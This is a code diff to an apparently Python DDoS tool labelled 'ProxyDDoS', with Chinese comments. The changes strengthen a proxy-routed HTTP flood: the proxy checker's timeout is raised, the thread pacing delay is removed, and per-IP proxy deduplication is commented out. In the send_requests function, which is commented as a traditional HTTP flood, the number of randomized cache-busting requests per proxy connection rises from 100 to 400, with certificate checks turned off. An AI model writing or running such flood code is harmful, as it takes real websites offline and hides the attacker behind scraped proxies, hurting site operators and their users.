@@ -120,7 +120,7 @@ def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
 
     s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
-    s.settimeout(1)
+    s.settimeout(2)
 
     try:
         s.connect((host, port))
@@ -164,7 +164,6 @@ def launchChecker(): # 開始檢測proxy
         t.daemon = True
         t.start()
         threads.append(t)
-        time.sleep(0.01)
 
     q.join()
 
@@ -317,15 +316,15 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
                 if len(lines) > 10 and len(lines) < 22:
                     download_proxy.append(lines)
 
-    uni_ip = set()
-    result = []
-    for item in download_proxy:
-        p_ip = item.split(":")[0]
-        if p_ip not in uni_ip:
-            uni_ip.add(p_ip)
-            result.append(item)
+    # uni_ip = set()
+    # result = []
+    # for item in download_proxy:
+    #     p_ip = item.split(":")[0]
+    #     if p_ip not in uni_ip:
+    #         uni_ip.add(p_ip)
+    #         result.append(item)
 
-    download_proxy = sorted(set(result))
+    download_proxy = sorted(set(download_proxy))
 
 
 def launchThreads():
@@ -354,12 +353,12 @@ def send_requests(): #傳統HTTP FLOOD
             s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
             try:
-                for _ in range(100):
+                for _ in range(400):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
                 print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
             except:
